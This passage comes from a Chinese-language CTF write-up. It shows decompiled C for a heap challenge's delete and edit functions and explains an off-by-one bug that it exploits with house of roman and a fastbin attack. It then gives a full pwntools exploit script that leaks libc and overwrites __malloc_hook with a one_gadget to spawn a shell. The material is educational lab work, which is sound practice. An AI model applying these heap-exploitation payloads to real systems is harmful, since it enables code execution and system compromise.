</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="nf">dele</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
</span><span class="c1"></span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input index:&#34;</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">sub_9E0</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_2020C0</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_2020C0</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">));</span>
    <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_2020C0</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
    <span class="n">dword_2020C8</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Index invalid!&#34;</span><span class="p">);</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>edit</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="nf">edit</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
</span><span class="c1"></span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input index:&#34;</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">sub_9E0</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_2020C0</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input data:&#34;</span><span class="p">);</span>
    <span class="n">sub_A34</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_2020C0</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">),</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">dword_2020C8</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]);</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Index invalid!&#34;</span><span class="p">);</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>远程环境为16.04漏洞点在<code>edit</code>有<code>off-by-one</code>，但是要回车跳出循环或者将<code>size+1</code>的空间全部填满。</p>
<p>思路还是很简单的，使用<code>house of roman</code>来申请<code>io</code>leak libc。然后使用<code>fastbin attack</code>覆写<code>__malloc_hook</code>。</p>
<p>难点在堆的布局，</p>
<p>首先，申请五个chunk，chunk_3是<code>fastbin victim</code>大小为0x70，在这个chunk尾部伪造一个0x20大小的chunk，用以后面进行分割，并将其释放掉。</p>
<p>再通过<code>off-by-one</code>chunk_0伪造一个<code>unsorted chunk = chunk_1 + chunk_2 + chunk_3</code>，这个chunk要包含<code>fastbin victim</code>。</p>
<p><code>edit</code>chunk_1将chunk_2的大小设为0x61，free(unsorted chunk)，这时再malloc(0x130)，<code>unsorted chunk</code>就会被分割，<code>unsorted bin</code>中只留下了chunk_3，而chunk_3在开始被加入了<code>fastbin</code>中。</p>
<p>free(chunk_2)，chunk_2被我们修改了大小，其尾部包含了<code>chunk_3</code>的头部，所以我们可以覆写其<code>fd</code>的低字节使其指向io_file就可以leak libc。</p>
<p>之后就简单的<code>fastbin attack</code>了。</p>
<h2 id="exp-6">exp</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">leak</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span><span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">{0}</span><span class="s1"> addr ---&gt; </span><span class="si">{1}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;DEBUG&#34;</span>
<span class="n">binary</span><span class="o">=</span><span class="s1">&#39;./pwn&#39;</span>

<span class="c1">#gdb.attach(sh)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice:&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;index:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;size:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;data:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice:&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;index:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;data:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice:&#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;index:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x100</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
            <span class="c1"># sh = remote(&#34;101.200.201.114&#34;, 30003)</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

            <span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
            
            <span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
            <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0xf8</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xb1</span><span class="s1">&#39;</span><span class="p">)</span>
            <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0xf0</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">))</span>
            <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

            <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x130</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
            <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xdd\x25</span><span class="s1">&#39;</span><span class="p">)</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x33</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
            
            <span class="n">libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3c5600</span>
            <span class="n">leak</span><span class="p">(</span><span class="s1">&#39;libc leak&#39;</span><span class="p">,</span><span class="n">libc</span><span class="p">)</span>
            <span class="n">delete</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
            <span class="n">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x61</span><span class="s1">&#39;</span><span class="p">)</span>
            <span class="n">delete</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3c4aed</span><span class="p">))</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
            <span class="n">realloc</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x84710</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0xb</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x4527a</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">realloc</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
            <span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
            <span class="n">leak</span><span class="p">(</span><span class="s1">&#39;realloc&#39;</span><span class="p">,</span><span class="n">realloc</span><span class="p">)</span>

            <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
        <span class="k">except</span> <span class="p">:</span>
            <span class="k">pass</span>
</code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2021-05-07</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/writeups/">Writeups</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/challenges-100-week-9/" class="prev" rel="prev" title="Challenges 100 Week 9"><i class="fas fa-angle-left fa-fw"></i>Challenges 100 Week 9</a>
            <a href="/posts/ciscn2021-pwn/" class="next" rel="next" title="Ciscn2021 Pwn">Ciscn2021 Pwn<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.87.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Niebelungen</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
